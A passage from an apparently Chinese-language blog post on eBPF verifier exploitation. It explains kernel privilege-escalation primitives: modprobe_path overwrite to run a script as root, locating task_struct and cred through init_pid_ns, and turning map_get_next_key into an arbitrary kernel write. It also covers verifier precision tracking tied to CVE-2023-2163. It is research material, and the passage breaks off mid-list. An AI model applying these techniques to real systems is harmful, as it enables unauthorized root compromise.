+<h3 id="b.-关于modprobe_path覆写的内核攻击手法">B. 关于modprobe_path覆写的内核攻击手法</h3>
+<p><code>modprobe_path</code>是用于在<code>Linux</code>内核中添加可加载的内核模块，当我们在<code>Linux</code>内核中安装或卸载新模块时，就会执行这个程序。他的路径是一个内核全局变量，默认为 <code>/sbin/modprobe</code>，可以通过如下命令来查看该值：</p>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250529184622149.png" alt><figcaption>image-20250529184622149</figcaption>
+</figure>
+<p><code>modprobe_path</code>存储在内核本身的<code>modprobe_path</code>符号中，且具有可写权限。也即普通权限即可修改该值。</p>
+<p>而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个 <code>modprobe_path</code>所指向的程序。如果我们将这个字符串指向我们自己的<code>sh</code>文件 ，并使用 <code>system</code>或 <code>execve</code> 去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以执行我们自己的二进制文件了。其调用流程如下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">do_execve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">do_execveat_common</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">bprm_execve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">exec_binprm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">search_binary_handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">request_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">call_usermodehelper</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
+<p>在<code>__request_module</code>的源码中我们也可以看到，最终是执行了<code>modprobe_path</code>指向的程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __request_module(<span class="type">bool</span> wait, <span class="type">const</span> <span class="type">char</span> *fmt, ...) </span><br><span class="line">{ </span><br><span class="line">    va_list args; </span><br><span class="line">    ......</span><br><span class="line">    ret = call_usermodehelper(modprobe_path, argv, envp,        </span><br><span class="line">            wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC); </span><br><span class="line">    <span class="type">atomic_dec</span>(&amp;kmod_concurrent);                                </span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>在函数<code>call_usermodehelper</code>中，实际上就会去执行指向的程序， <strong>在内核空间以root权限执行用户指定的程序</strong>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">call_usermodehelper</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> **argv, <span class="type">char</span> **envp, <span class="type">int</span> wait)</span>             </span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span>                                                      </span><br><span class="line">    <span class="type">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;                  </span><br><span class="line">    info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line">                     <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);                                                </span><br><span class="line">    <span class="keyword">if</span> (info == <span class="literal">NULL</span>)                                                                  </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;                                                             </span><br><span class="line">    <span class="keyword">return</span> call_usermodehelper_exec(info, wait);                                       </span><br><span class="line">}                                                                                      </span><br><span class="line">EXPORT_SYMBOL(call_usermodehelper);                                                    </span><br></pre></td></tr></table></figure>
+<p>所以我们在普通用户空间去执行<code>chmod 777 flag</code>的时候肯定是不被允许的，因为我们没有对<code>flag</code>文件的修改权限，但是我们可以覆盖<code>modprobe_path</code>再触发内核<code>modehelper</code>去执行<code>chmod 777 flag</code>， 这样就可以达到攻击的目的。</p>
+<blockquote>
+<p>但在很多时候<code>modprobe_path</code>的符号地址并不会呈现在<code>/proc/kallsyms</code>中，但是request_mudule中有对该符号的引用，我们可以通过在<code>request_module</code>打断点来查看<code>modprobe_path</code>的地址～</p>
+</blockquote>
+<h3 id="c.-关于task_struct覆写的内核攻击手法">C. 关于task_struct覆写的内核攻击手法</h3>
+<p><code>fork</code>进程/线程时，<code>copy_process()</code>会给此线程<code>alloc</code>一个<code>struct pid</code>结构体。当是<code>fork</code>进程/线程时，<code>copy_process()</code>的<code>pid</code>参数将是<code>null</code>，所以会<code>call alloc_pid()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __latent_entropy <span class="keyword">struct</span> task_struct *<span class="title function_">copy_process</span><span class="params">(</span></span><br><span class="line"><span class="params">                    <span class="type">unsigned</span> <span class="type">long</span> clone_flags,</span></span><br><span class="line"><span class="params">                    <span class="type">unsigned</span> <span class="type">long</span> stack_start,</span></span><br><span class="line"><span class="params">                    <span class="type">unsigned</span> <span class="type">long</span> stack_size,</span></span><br><span class="line"><span class="params">                    <span class="type">int</span> __user *child_tidptr,</span></span><br><span class="line"><span class="params">                    <span class="keyword">struct</span> pid *pid,</span></span><br><span class="line"><span class="params">                    <span class="type">int</span> trace,</span></span><br><span class="line"><span class="params">                    <span class="type">unsigned</span> <span class="type">long</span> tls,</span></span><br><span class="line"><span class="params">                    <span class="type">int</span> node)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (pid != &amp;init_struct_pid) {</span><br><span class="line">        pid = alloc_pid(p-&gt;nsproxy-&gt;pid_ns_for_children);</span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(pid)) {</span><br><span class="line">            retval = PTR_ERR(pid);</span><br><span class="line">            <span class="keyword">goto</span> bad_fork_cleanup_thread;</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
+<p>在内核中，ksymtab保存着init_pid_ns结构的偏移，而kstrtab则保存着init_pid_ns的字符串。通过GDB调试可以观察到这一过程：</p>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250529190630046.png" alt><figcaption>image-20250529190630046</figcaption>
+</figure>
+<p>查找的核心思路是首先通过搜索"init_pid_ns"字符串来获得kstrtab_init_pid_ns的地址。检查某个地址加上该地址处的四个字节偏移值是否等于kstrtab_init_pid_ns的地址，这样可以判断是否为ksymtab_init_pid_ns。找到的地址实际上是ksymtab_init_pid_ns+4，因此需要减去4才能得到真正的ksymtab_init_pid_ns地址。最终通过ksymtab_init_pid_ns地址加上其中保存的init_pid_ns结构偏移，就能获得init_pid_ns结构的实际地址。</p>
+<p>一旦获得了pid和init_pid_ns，就需要通过它们查找对应进程的task_struct。这个过程实际上是在模拟内核的查找机制。内核使用find_task_by_pid_ns函数来实现这一功能：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> task_struct *<span class="title function_">find_task_by_pid_ns</span><span class="params">(<span class="type">pid_t</span> nr, <span class="keyword">struct</span> pid_namespace *ns)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> pid_task(find_pid_ns(nr, ns), PIDTYPE_PID);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>这个函数的参数nr是当前进程的pid，ns是init_pid_ns结构地址。函数内部首先调用find_pid_ns来查找对应的pid结构，然后通过pid_task获取最终的task_struct。</p>
+<p>find_pid_ns函数进一步调用了idr_find函数，这里需要获取idr字段的内容。idr_find的实现相对简单，它调用radix_tree_lookup函数在基数树中进行查找：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">idr_find</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> idr *idr, <span class="type">unsigned</span> <span class="type">long</span> id)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> radix_tree_lookup(&amp;idr-&gt;idr_rt, id - idr-&gt;idr_base);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>这里需要注意两个关键参数：idr_rt和idr_base。</p>
+<p>基数树查找是整个过程中最复杂的部分。__radix_tree_lookup函数实现了核心的查找逻辑。函数首先将root-&gt;xa_head的值赋给node变量，然后进入循环查找过程。在循环中，通过radix_tree_descend函数不断向下搜索，直到找到目标进程的node。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">radix_tree_descend</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> radix_tree_node *parent, </span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> radix_tree_node **nodep, <span class="type">unsigned</span> <span class="type">long</span> index)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset = (index &gt;&gt; parent-&gt;shift) &amp; RADIX_TREE_MAP_MASK;</span><br><span class="line">    <span class="type">void</span> __rcu **entry = rcu_dereference_raw(parent-&gt;slots[offset]);</span><br><span class="line">    *nodep = (<span class="type">void</span> *)entry;</span><br><span class="line">    <span class="keyword">return</span> offset;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>radix_tree_descend函数通过读取parent-&gt;shift的值并与0x3f进行与运算来计算偏移，然后获取parent-&gt;slots[offset]作为下一个node。当parent-&gt;shift为0时，说明已经找到了当前进程的node，此时退出循环。</p>
+<p>获得当前进程的node后，需要通过pid_task函数获取相应的task_struct。这个函数使用PIDTYPE_PID作为类型参数，其值为0。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> task_struct *<span class="title function_">pid_task</span><span class="params">(<span class="keyword">struct</span> pid *pid, <span class="keyword">enum</span> pid_type type)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">result</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (pid) {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">first</span>;</span></span><br><span class="line">        first = rcu_dereference_check(hlist_first_rcu(&amp;pid-&gt;tasks[type]),</span><br><span class="line">                          lockdep_tasklist_lock_is_held());</span><br><span class="line">        <span class="keyword">if</span> (first)</span><br><span class="line">            result = hlist_entry(first, <span class="keyword">struct</span> task_struct, pid_links[(type)]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>函数首先获取pid-&gt;tasks[0]的内容，这里的first实际上是pid_links[0]的地址。通过hlist_entry宏，可以从这个地址反推出task_struct的起始地址。相关的结构字段偏移可以通过GDB查看，task_struct中pid_links[0]的偏移为0x500，而pid结构中tasks[0]的偏移为0x8。</p>
+<p>整个查找过程完成后，就能够定位到task_struct中cred字段的位置，从而实现对进程凭证的访问和操作。这一机制在内核利用开发中具有重要意义，因为它揭示了内核如何组织和管理进程信息的内部结构。</p>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250529185935192.png" alt><figcaption>image-20250529185935192</figcaption>
+</figure>
+<h3 id="d.-关于map_get_next_key触发任意地址写">D. 关于map_get_next_key触发任意地址写</h3>
+<p>首先我们知道<code>map_push_elem</code>的函数声明：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">bpf_map_push_elem</span><span class="params">(<span class="keyword">struct</span> bpf_map *<span class="built_in">map</span>, <span class="type">const</span> <span class="type">void</span> *value, u64 flags)</span></span><br></pre></td></tr></table></figure>
+<p>可以使用 <code>bpf_map_push_elem</code> 助手将元素 <code>value</code> 添加到队列或堆栈中。<code>flags</code> 参数必须设置为 <code>BPF_ANY</code> 或 <code>BPF_EXIST</code>。如果 <code>flags</code> 设置为 <code>BPF_EXIST</code>，则当队列或堆栈已满时，将删除最旧的元素，以便为要添加的 <code>value</code> 腾出空间。成功时返回 <code>0</code>，失败时返回负错误。</p>
+<p>我们再来看一下<code>map_get_next_key</code>的函数实现：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">array_map_get_next_key</span><span class="params">(<span class="keyword">struct</span> bpf_map *<span class="built_in">map</span>, <span class="type">void</span> *key, <span class="type">void</span> *next_key)</span>   </span><br><span class="line">{                                                                                   </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, <span class="keyword">struct</span> bpf_array, <span class="built_in">map</span>);             </span><br><span class="line">    u32 index = key ? *(u32 *)key : U32_MAX;                                        </span><br><span class="line">    u32 *next = (u32 *)next_key;                                                    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries) {    <span class="comment">//index                                      </span></span><br><span class="line">        *next = <span class="number">0</span>;                                                                  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                                                                   </span><br><span class="line">    }                                                                               </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index == <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries - <span class="number">1</span>)                                        </span><br><span class="line">        <span class="keyword">return</span> -ENOENT;                                                             </span><br><span class="line"></span><br><span class="line">    *next = index + <span class="number">1</span>;                                                              </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                                                                       </span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>如果我们将<code>map_push_elem</code>的指针覆盖为<code>map_get_next_key</code>就会有：</p>
+<ul>
+<li><code>map</code> = <code>map</code></li>
+<li><code>value</code> = <code>key</code></li>
+<li><code>flags</code> = <code>next_key</code></li>
+</ul>
+<p>这样在执行<code>*next = next_key</code>时，实际上就是将<code>next = flags</code>, 同时注意到<code>index = *key</code>, <code>*key</code>即是<code>bpf_map</code>中的<code>value[0]</code>, <code>key</code>为<code>bpf_map</code>中首个键值对中值的地址。</p>
+<p>当执行到<code>*next = index + 1</code>时，实际上就是<code>*flags = value[0] + 1</code> 这样这要我们在输入的时候控制<code>flags</code>的值为我们想要写的地址，<code>value[0]</code>是<code>bpf_map</code>中可控的值，我们就可以触发内核空间任意地址写。</p>
+<blockquote>
+<p>需要注意，<code>bpf_map</code>调用<code>map_push_elem</code>的前提是<code>map</code>的类型是<code>BPF_MAP_TYPE_QUEUE</code>或者<code>BPF_MAP_TYPE_STACK</code>, 在触发该漏洞之前必须通过其他手段更改<code>map</code>的类型字段。</p>
+</blockquote>
+<h3 id="e.-关于verifier对寄存器的精确标记">E. 关于<code>verifier</code>对寄存器的精确标记</h3>
+<p>精确标记存储在 <code>bpf_reg_state</code> 结构中，定义在<code>include/linux/bpf_verifier.h</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span> <span class="comment">/* 寄存器类型，如标量或指针 */</span></span><br><span class="line">    s64 umin_value;         <span class="comment">/* 最小值 */</span></span><br><span class="line">    s64 umax_value;         <span class="comment">/* 最大值 */</span></span><br><span class="line">    <span class="type">bool</span> precise;           <span class="comment">/* 是否需要精确追踪 */</span></span><br><span class="line">    ...</span><br><span class="line">};</span><br></pre></td></tr></table></figure>
+<p>精确追踪实际上是为了辅助<code>verifier</code>进行剪枝，在下面几种情况下需要对寄存器进行精确标记：</p>
+<p><strong>1. 指针运算</strong></p>
+<p>当一个寄存器用于指针偏移（如 <code>r0 += r6</code>），<code>r6</code> 被标记为精确，因为其值直接影响内存访问的安全性。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: (b7) r6 = <span class="number">4</span>                        <span class="comment">// r6 = 4</span></span><br><span class="line"><span class="number">1</span>: (<span class="number">18</span>) r1 = <span class="number">0xffff888123456789</span>       <span class="comment">// r1 = 映射指针 (ks=4, vs=8)</span></span><br><span class="line"><span class="number">3</span>: (bf) r2 = r10                     <span class="comment">// r2 = 栈指针</span></span><br><span class="line"><span class="number">4</span>: (<span class="number">07</span>) r2 += <span class="number">-4</span>                     <span class="comment">// r2 = r10 - 4</span></span><br><span class="line"><span class="number">5</span>: (<span class="number">63</span>) *(u32 *)(r10 - <span class="number">4</span>) = r6       <span class="comment">// 栈写入 r6 (4)</span></span><br><span class="line"><span class="number">6</span>: (<span class="number">85</span>) call bpf_map_lookup_elem#<span class="number">1</span>   <span class="comment">// r0 = 映射值</span></span><br><span class="line"><span class="number">7</span>: (<span class="number">0f</span>) r0 += r6                     <span class="comment">// 指针偏移: r0 += r6</span></span><br><span class="line"><span class="number">8</span>: (<span class="number">79</span>) r3 = *(u64 *)(r0 + <span class="number">0</span>)        <span class="comment">// 读取 r0</span></span><br><span class="line"><span class="number">9</span>: (<span class="number">95</span>) <span class="built_in">exit</span>                         <span class="comment">// 退出</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>第 7 行：<code>r0 += r6</code>，<code>r6</code> 用于指针偏移，影响 <code>r0</code> 的地址。</p></li>
+<li><p>第 8 行：读取 <code>r0</code>，需确保 <code>r0</code> 在映射值边界内（0 到 7 字节）。</p></li>
+<li><p><code>r6</code> 被标记为精确（<code>reg-&gt;precise = true</code>），因为其值（4）决定指针偏移。</p></li>
+<li><p>验证器回溯确保 <code>r6</code> 在所有路径中是精确的常数（<code>R6=4</code>）。</p></li>
+<li><p><strong>验证器状态</strong>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0</span>: R6_w=<span class="number">4</span></span><br><span class="line"><span class="attribute">7</span>: R0=map_value(<span class="literal">off</span>=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8</span>) R6=<span class="number">4</span> (R6: P)</span><br><span class="line"><span class="attribute">8</span>: 访问 r0 + <span class="number">4</span>: 安全</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>2. 辅助函数调用</strong></p>
+<p>某些函数（如 <code>bpf_map_lookup_elem</code>）要求参数是精确的常数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: (b7) r6 = <span class="number">0</span>                        <span class="comment">// r6 = 0</span></span><br><span class="line"><span class="number">1</span>: (<span class="number">18</span>) r1 = <span class="number">0xffff888123456789</span>       <span class="comment">// r1 = 映射指针 (ks=4, vs=8)</span></span><br><span class="line"><span class="number">3</span>: (bf) r2 = r10                     <span class="comment">// r2 = 栈指针</span></span><br><span class="line"><span class="number">4</span>: (<span class="number">07</span>) r2 += <span class="number">-4</span>                     <span class="comment">// r2 = r10 - 4</span></span><br><span class="line"><span class="number">5</span>: (<span class="number">63</span>) *(u32 *)(r10 - <span class="number">4</span>) = r6       <span class="comment">// 栈写入 r6 (0)</span></span><br><span class="line"><span class="number">6</span>: (<span class="number">85</span>) call bpf_map_lookup_elem#<span class="number">1</span>   <span class="comment">// 调用映射查找</span></span><br><span class="line"><span class="number">7</span>: (<span class="number">95</span>) <span class="built_in">exit</span>                         <span class="comment">// 退出</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>第 5 行：<code>*(u32 *)(r10 - 4) = r6</code>，<code>r6</code> 写入栈，作为 <code>bpf_map_lookup_elem</code> 的键。</p></li>
+<li><p>第 6 行：调用 <code>bpf_map_lookup_elem</code>，要求键（<code>r10 - 4</code> 的值）是精确常数。</p></li>
+<li><p><code>r6</code> 被标记为精确，因为其值（0）被写入栈，栈槽 <code>r10 - 4</code> 用作函数参数。</p></li>
+<li><p>验证器确保 <code>r6</code> 在所有路径中是精确的（<code>R6=0</code>）。</p></li>
+<li><p><strong>验证器状态</strong>：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0: <span class="attribute">R6_w</span>=0</span><br><span class="line">5: <span class="attribute">fp-4</span>=0 (R6: P)</span><br><span class="line">6: <span class="attribute">R0</span>=map_value_or_null</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>3. 条件跳转</strong> (在cve-2023-2163修复中新增)</p>
+<p>如果一个条件跳转（如 <code>if r6 &lt;= r9</code>）影响一个精确寄存器的值，则相关寄存器可能需要标记为精确。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: (b7) r6 = <span class="number">2</span>                        <span class="comment">// r6 = 2</span></span><br><span class="line"><span class="number">1</span>: (b7) r9 = <span class="number">1</span>                        <span class="comment">// r9 = 1</span></span><br><span class="line"><span class="number">2</span>: (b5) <span class="keyword">if</span> r6 &lt;= r9 <span class="keyword">goto</span> pc+<span class="number">1</span>         <span class="comment">// if r6 &lt;= r9, 跳转到 4</span></span><br><span class="line"><span class="number">3</span>: (b7) r6 = <span class="number">0</span>                        <span class="comment">// r6 = 0</span></span><br><span class="line"><span class="number">4</span>: (<span class="number">18</span>) r1 = <span class="number">0xffff888123456789</span>       <span class="comment">// r1 = 映射指针 (ks=4, vs=8)</span></span><br><span class="line"><span class="number">6</span>: (bf) r2 = r10                     <span class="comment">// r2 = 栈指针</span></span><br><span class="line"><span class="number">7</span>: (<span class="number">07</span>) r2 += <span class="number">-4</span>                     <span class="comment">// r2 = r10 - 4</span></span><br><span class="line"><span class="number">8</span>: (<span class="number">63</span>) *(u32 *)(r10 - <span class="number">4</span>) = r6       <span class="comment">// 栈写入 r6</span></span><br><span class="line"><span class="number">9</span>: (<span class="number">85</span>) call bpf_map_lookup_elem#<span class="number">1</span>   <span class="comment">// 调用映射查找</span></span><br><span class="line"><span class="number">10</span>: (<span class="number">95</span>) <span class="built_in">exit</span>                         <span class="comment">// 退出</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>第 2 行：<code>if r6 &lt;= r9</code>，<code>r6</code> 和 <code>r9</code> 比较，影响 <code>r6</code> 的值。</p></li>
+<li><p>第 8 行：<code>r6</code> 写入栈，需精确（用于 <code>bpf_map_lookup_elem</code>）。</p></li>
+<li><p><code>r6</code> 被标记为精确（<code>R6: P</code>），因为其值写入栈。</p></li>
+<li><p><code>r9</code> 也被标记为精确（<code>R9: P</code>），因为第 2 行的条件跳转（<code>r6 &lt;= r9</code>）约束了 <code>r6</code> 的值。</p></li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0: <span class="attribute">R6_w</span>=2</span><br><span class="line">1: <span class="attribute">R9_w</span>=1</span><br><span class="line">2: (b5) <span class="keyword">if</span> r6 &lt;= r9 goto pc+1 ; <span class="attribute">R6</span>=2, <span class="attribute">R9</span>=1 (R6: P, R9: P)</span><br><span class="line">3: <span class="attribute">R6_w</span>=0</span><br><span class="line">8: <span class="attribute">fp-4</span>=0 (R6: P)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>跳转到 4</strong>：<code>r6 &lt;= 1</code> 不成立（<code>2 &gt; 1</code>），不触发。</li>
+<li><strong>继续到 3</strong>：<code>r6 = 0</code>，写入栈，安全。</li>
+</ul>
+<p><strong>4. 依赖传播</strong></p>
+<p>如果一个精确寄存器的值依赖于其他寄存器或栈槽，这些依赖项也会被标记为精确。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: (b7) r7 = <span class="number">8</span>                        <span class="comment">// r7 = 8</span></span><br><span class="line"><span class="number">1</span>: (bf) r6 = r7                      <span class="comment">// r6 = r7</span></span><br><span class="line"><span class="number">2</span>: (<span class="number">18</span>) r1 = <span class="number">0xffff888123456789</span>       <span class="comment">// r1 = 映射指针 (ks=4, vs=8)</span></span><br><span class="line"><span class="number">4</span>: (bf) r2 = r10                     <span class="comment">// r2 = 栈指针</span></span><br><span class="line"><span class="number">5</span>: (<span class="number">07</span>) r2 += <span class="number">-4</span>                     <span class="comment">// r2 = r10 - 4</span></span><br><span class="line"><span class="number">6</span>: (<span class="number">63</span>) *(u32 *)(r10 - <span class="number">4</span>) = r6       <span class="comment">// 栈写入 r6</span></span><br><span class="line"><span class="number">7</span>: (<span class="number">85</span>) call bpf_map_lookup_elem#<span class="number">1</span>   <span class="comment">// 调用映射查找</span></span><br><span class="line"><span class="number">8</span>: (<span class="number">55</span>) <span class="keyword">if</span> r0 != <span class="number">0x0</span> <span class="keyword">goto</span> pc+<span class="number">1</span>       <span class="comment">// if r0 非空，跳转</span></span><br><span class="line"><span class="number">9</span>: (<span class="number">95</span>) <span class="built_in">exit</span>                         <span class="comment">// 退出</span></span><br><span class="line"><span class="number">10</span>: (<span class="number">0f</span>) r0 += r6                     <span class="comment">// 指针偏移: r0 += r6</span></span><br><span class="line"><span class="number">11</span>: (<span class="number">79</span>) r3 = *(u64 *)(r0 + <span class="number">0</span>)        <span class="comment">// 读取 r0</span></span><br><span class="line"><span class="number">12</span>: (<span class="number">95</span>) <span class="built_in">exit</span>                         <span class="comment">// 退出</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>第 1 行：<code>r6 = r7</code>，<code>r6</code> 的值依赖于 <code>r7</code>。</p></li>
+<li><p>第 6 行：<code>r6</code> 写入栈，需精确（用于 <code>bpf_map_lookup_elem</code>）。</p></li>
+<li><p>第 10 行：<code>r0 += r6</code>，<code>r6</code> 用于指针运算，需精确。</p></li>
+<li><p><code>r6</code> 被标记为精确（<code>R6: P</code>），因为其用于栈写入和指针运算。</p></li>
+<li><p><code>r7</code> 被标记为精确（<code>R7: P</code>），因为 <code>r6</code> 的值依赖于 <code>r7</code>（第 1 行）。</p></li>
+<li><p><strong>验证器状态</strong>：</p>
